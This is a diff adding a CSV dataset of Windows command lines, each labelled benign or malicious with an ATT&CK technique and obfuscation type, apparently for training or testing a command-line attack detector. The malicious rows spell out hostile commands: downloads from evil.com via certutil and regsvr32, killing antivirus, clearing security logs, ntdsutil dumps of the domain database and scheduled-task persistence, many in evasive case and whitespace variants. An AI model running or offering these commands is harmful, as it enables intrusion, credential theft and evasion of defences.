@@ -1,0 +1,99 @@
+command,label,technique,source,obfuscation_type,privilege_level,command_id,dataset_version,creation_date
+echo Checking system... & ping	google.com,benign,administrative,admin_variant,whitespace,high,63,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""forfiles /p C:\windows\system32 /m notepad.exe /c calc.exe""",malicious,T1047,volt_typhoon_variant,none,high,41,2.0_alternative_syntax,2025-11-24
+cmd.exe /c diskpart	list	disk,benign,administrative,admin_variant,whitespace,user,95,2.0_alternative_syntax,2025-11-24
+TaSkKiLl /F /iM AnTiViRuS.ExE,malicious,T1059.001,volt_typhoon_variant,case_variation,user,19,2.0_alternative_syntax,2025-11-24
+echo Checking system... & net share,benign,administrative,admin_variant,none,high,82,2.0_alternative_syntax,2025-11-24
+net  share > C:\temp\output.txt,benign,administrative,admin_variant,whitespace,user,84,2.0_alternative_syntax,2025-11-24
+ipconfig	/all > C:\temp\output.txt,benign,administrative,admin_variant,whitespace,user,65,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""forfiles	/p	C:\windows\system32	/m	notepad.exe	/c	calc.exe""",malicious,T1059.001,volt_typhoon_variant,whitespace,high,43,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""certutil -urlcache -split -f http://evil.com/payload.exe""",malicious,T1105,volt_typhoon_variant,none,medium,11,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""net user admin /active:yes"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,shortened,high,1,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""regsvr32	/s	/n	/u	/i:http://evil.com/file.sct	scrobj.dll""",malicious,T1218.010,volt_typhoon_variant,whitespace,medium,32,2.0_alternative_syntax,2025-11-24
+net	statistics,benign,administrative,admin_variant,whitespace,user,76,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""WeVtUtIl cL SeCuRiTy""",malicious,T1070.001,volt_typhoon_variant,case_variation,high,48,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""ntdsutil snapshot ""activate instance ntds"" create quit quit""",malicious,T1003.003,volt_typhoon_variant,none,high,27,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""wevtutil  cl  security""",malicious,T1070.001,volt_typhoon_variant,whitespace,high,45,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""net  user  administrator  /active:yes"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,whitespace,high,5,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""cscript --nologo --e:jscript C:\temp\payload.js"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,syntax_variation,high,23,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""certutil	-urlcache	-split	-f	http://evil.com/payload.exe""",malicious,T1105,volt_typhoon_variant,whitespace,medium,13,2.0_alternative_syntax,2025-11-24
+echo Checking system... & dism /online /cleanup-image /restorehealth,benign,administrative,admin_variant,none,high,91,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""tasklist  /svc""",benign,administrative,admin_variant,whitespace,user,74,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""netsh  interface  portproxy  add  v4tov4  listenaddress=0.0.0.0"" /sc onlogon",malicious,T1562.004,volt_typhoon_variant,whitespace,high,50,2.0_alternative_syntax,2025-11-24
+msconfig > C:\temp\output.txt,benign,administrative,admin_variant,none,user,71,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""wmic  bios  get  serialnumber""",benign,administrative,admin_variant,whitespace,medium,69,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""taskkill /f /im antivirus.exe""",malicious,T1059.001,volt_typhoon_variant,none,user,16,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""forfiles -p C:\windows\system32 -m notepad.exe -c calc.exe""",malicious,T1059.001,volt_typhoon_variant,syntax_variation,high,40,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""regsvr32 -s -n -u -i:http:--evil.com-file.sct scrobj.dll""",malicious,T1218.010,volt_typhoon_variant,syntax_variation,medium,34,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""bcdedit  /set  {default}  bootstatuspolicy  ignoreallfailures""",malicious,T1490,volt_typhoon_variant,whitespace,high,10,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""powershell Get-Process""",benign,administrative,admin_variant,none,user,81,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""certutil -urlcache -split -f http:--evil.com-payload.exe"" /sc onlogon",malicious,T1105,volt_typhoon_variant,syntax_variation,high,12,2.0_alternative_syntax,2025-11-24
+ipconfig -all > C:\temp\output.txt,benign,administrative,admin_variant,syntax_variation,user,66,2.0_alternative_syntax,2025-11-24
+cmd.exe /c diskpart list disk,benign,administrative,admin_variant,none,user,94,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"" /sc onlogon",malicious,T1218.010,volt_typhoon_variant,none,high,31,2.0_alternative_syntax,2025-11-24
+"ntdsutil	snapshot	""activate	instance	ntds""	create	quit	quit",malicious,T1003.003,volt_typhoon_variant,whitespace,high,29,2.0_alternative_syntax,2025-11-24
+cmd.exe /c dir	C:\Windows\System32,benign,administrative,admin_variant,whitespace,high,89,2.0_alternative_syntax,2025-11-24
+bcdedit	/set	{default}	bootstatuspolicy	ignoreallfailures,malicious,T1490,volt_typhoon_variant,whitespace,high,6,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""wevtutil	cl	security"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,whitespace,high,46,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""wmic bios get serialnumber""",benign,administrative,admin_variant,none,medium,70,2.0_alternative_syntax,2025-11-24
+mshta	javascript:alert(document.cookie),malicious,T1218.005,volt_typhoon_variant,whitespace,user,36,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""taskkill  /f  /im  antivirus.exe""",malicious,T1059.001,volt_typhoon_variant,whitespace,user,17,2.0_alternative_syntax,2025-11-24
+echo Checking system... & tasklist -svc,benign,administrative,admin_variant,syntax_variation,high,73,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""regsvr32  /s  /n  /u  /i:http://evil.com/file.sct  scrobj.dll""",malicious,T1047,volt_typhoon_variant,whitespace,medium,35,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""bcdedit /set {default} bootstatuspolicy ignoreallfailures""",malicious,T1047,volt_typhoon_variant,none,high,8,2.0_alternative_syntax,2025-11-24
+echo Checking system... & nslookup	microsoft.com,benign,administrative,admin_variant,whitespace,high,56,2.0_alternative_syntax,2025-11-24
+"ntdsutil snapshot ""ac i ntds"" cr quit quit",malicious,T1003.003,volt_typhoon_variant,shortened,high,28,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""taskkill -f -im antivirus.exe""",malicious,T1059.001,volt_typhoon_variant,syntax_variation,user,20,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""powershell  Get-Process""",benign,administrative,admin_variant,"whitespace,case_variation",user,80,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""NtDsUtIl sNaPsHoT ""aCtIvAtE InStAnCe nTdS"" cReAtE QuIt qUiT""",malicious,T1003.003,volt_typhoon_variant,case_variation,high,26,2.0_alternative_syntax,2025-11-24
+echo Checking system... & nslookup  microsoft.com,benign,administrative,admin_variant,whitespace,high,54,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""CeRtUtIl -UrLcAcHe -SpLiT -f hTtP://EvIl.cOm/pAyLoAd.eXe"" /sc onlogon",malicious,T1105,volt_typhoon_variant,case_variation,high,14,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""cscript //nologo //e:jscript C:\temp\payload.js""",malicious,T1059.001,volt_typhoon_variant,none,user,25,2.0_alternative_syntax,2025-11-24
+NeT UsEr aDmInIsTrAtOr /AcTiVe:yEs,malicious,T1059.001,volt_typhoon_variant,case_variation,high,4,2.0_alternative_syntax,2025-11-24
+taskkill	/f	/im	antivirus.exe,malicious,T1059.001,volt_typhoon_variant,whitespace,user,18,2.0_alternative_syntax,2025-11-24
+mshta  javascript:alert(document.cookie),malicious,T1218.005,volt_typhoon_variant,whitespace,user,39,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""BcDeDiT /sEt {DeFaUlT} bOoTsTaTuSpOlIcY IgNoReAlLfAiLuReS"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,case_variation,high,9,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""net statistics""",benign,administrative,admin_variant,none,user,77,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""bcdedit -set {default} bootstatuspolicy ignoreallfailures""",malicious,T1490,volt_typhoon_variant,syntax_variation,high,7,2.0_alternative_syntax,2025-11-24
+cmd.exe /c powershell	Get-Process,benign,administrative,admin_variant,whitespace,user,79,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""MsHtA JaVaScRiPt:aLeRt(dOcUmEnT.CoOkIe)""",malicious,T1218.005,volt_typhoon_variant,case_variation,user,37,2.0_alternative_syntax,2025-11-24
+dir C:\Windows\System32 > C:\temp\output.txt,benign,administrative,admin_variant,none,high,86,2.0_alternative_syntax,2025-11-24
+echo Checking system... & cmd /c echo %PATH%,benign,administrative,admin_variant,none,high,57,2.0_alternative_syntax,2025-11-24
+services.msc,benign,administrative,admin_variant,none,user,98,2.0_alternative_syntax,2025-11-24
+cmd.exe /c nslookup microsoft.com,benign,administrative,admin_variant,none,user,55,2.0_alternative_syntax,2025-11-24
+FoRfIlEs /P C:\wInDoWs\sYsTeM32 /m nOtEpAd.eXe /C CaLc.eXe,malicious,T1059.001,volt_typhoon_variant,case_variation,high,44,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""netstat	-an""",benign,administrative,admin_variant,whitespace,user,51,2.0_alternative_syntax,2025-11-24
+ipconfig /all,benign,administrative,admin_variant,none,user,67,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""wevtutil cl security"" /sc onlogon",malicious,T1053.005,volt_typhoon_variant,none,high,47,2.0_alternative_syntax,2025-11-24
+wmic	bios	get	serialnumber,benign,administrative,admin_variant,whitespace,medium,68,2.0_alternative_syntax,2025-11-24
+ping  google.com > C:\temp\output.txt,benign,administrative,admin_variant,whitespace,user,62,2.0_alternative_syntax,2025-11-24
+cmd.exe /c diskpart  list  disk,benign,administrative,admin_variant,whitespace,user,96,2.0_alternative_syntax,2025-11-24
+net  statistics,benign,administrative,admin_variant,whitespace,user,78,2.0_alternative_syntax,2025-11-24
+forfiles /p C:\windows\sys32 /m notepad.exe /c calc.exe,malicious,T1059.001,volt_typhoon_variant,shortened,user,42,2.0_alternative_syntax,2025-11-24
+echo Checking system... & cmd  /c  echo  %PATH%,benign,administrative,admin_variant,"whitespace,case_variation",high,59,2.0_alternative_syntax,2025-11-24
+"wmic.exe process call create ""netsh interface portproxy add v4tov4 listenaddress=0.0.0.0""",malicious,T1047,volt_typhoon_variant,none,medium,49,2.0_alternative_syntax,2025-11-24
+dir C:\WINDOWS\SYSTEM~1 > C:\temp\output.txt,benign,administrative,admin_variant,case_variation,high,85,2.0_alternative_syntax,2025-11-24
+cmd -c echo %PATH%,benign,administrative,admin_variant,syntax_variation,user,58,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""ReGsVr32 /S /n /U /i:hTtP://EvIl.cOm/fIlE.ScT ScRoBj.dLl""",malicious,T1218.010,volt_typhoon_variant,case_variation,medium,33,2.0_alternative_syntax,2025-11-24
+svcs.msc > C:\temp\output.txt,benign,administrative,admin_variant,shortened,user,97,2.0_alternative_syntax,2025-11-24
+cmd	/c	echo	%PATH% > C:\temp\output.txt,benign,administrative,admin_variant,whitespace,user,60,2.0_alternative_syntax,2025-11-24
+ipconfig  /all > C:\temp\output.txt,benign,administrative,admin_variant,whitespace,user,64,2.0_alternative_syntax,2025-11-24
+dism  /online  /cleanup-image  /restorehealth,benign,administrative,admin_variant,whitespace,user,92,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""mshta javascript:alert(document.cookie)""",malicious,T1218.005,volt_typhoon_variant,none,user,38,2.0_alternative_syntax,2025-11-24
+"schtasks /create /tn ""SystemUpdate"" /tr ""ntdsutil snapshot 'activate instance ntds' create quit quit"" /sc onlogon",malicious,T1003.003,volt_typhoon_variant,quotes,high,30,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""net user administrator /active:yes""",malicious,T1059.001,volt_typhoon_variant,none,high,2,2.0_alternative_syntax,2025-11-24
+echo Checking system... & netstat -an,benign,administrative,admin_variant,none,high,53,2.0_alternative_syntax,2025-11-24
+"cmd.exe /c ""cscript	//nologo	//e:jscript	C:\temp\payload.js""",malicious,T1059.001,volt_typhoon_variant,whitespace,user,22,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""net user administrator -active:yes""",malicious,T1059.001,volt_typhoon_variant,syntax_variation,high,3,2.0_alternative_syntax,2025-11-24
+CsCrIpT //NoLoGo //e:jScRiPt c:\TeMp\pAyLoAd.jS,malicious,T1059.001,volt_typhoon_variant,case_variation,user,24,2.0_alternative_syntax,2025-11-24
+cmd.exe /c dir %WINDIR%\System32,benign,administrative,admin_variant,"shortened,environment_vars,case_variation",high,88,2.0_alternative_syntax,2025-11-24
+echo Checking system... & dism	/online	/cleanup-image	/restorehealth,benign,administrative,admin_variant,whitespace,high,90,2.0_alternative_syntax,2025-11-24
+tasklist	/svc,benign,administrative,admin_variant,whitespace,user,75,2.0_alternative_syntax,2025-11-24
+echo Checking system... & dir  C:\Windows\System32,benign,administrative,admin_variant,"whitespace,case_variation",high,87,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""net	share""",benign,administrative,admin_variant,whitespace,user,83,2.0_alternative_syntax,2025-11-24
+cscript  //nologo  //e:jscript  C:\temp\payload.js,malicious,T1059.001,volt_typhoon_variant,"whitespace,case_variation",user,21,2.0_alternative_syntax,2025-11-24
+cmd.exe /c ping google.com,benign,administrative,admin_variant,none,user,61,2.0_alternative_syntax,2025-11-24
+"powershell.exe -c ""tasklist /svc""",benign,administrative,admin_variant,none,user,72,2.0_alternative_syntax,2025-11-24
+"powershell.exe -windowstyle hidden -exec bypass -c ""certutil  -urlcache  -split  -f  http://evil.com/payload.exe""",malicious,T1105,volt_typhoon_variant,whitespace,medium,15,2.0_alternative_syntax,2025-11-24
+echo Checking system... & dism -online -cleanup-image -restorehealth,benign,administrative,admin_variant,syntax_variation,high,93,2.0_alternative_syntax,2025-11-24
+netstat  -an,benign,administrative,admin_variant,whitespace,user,52,2.0_alternative_syntax,2025-11-24
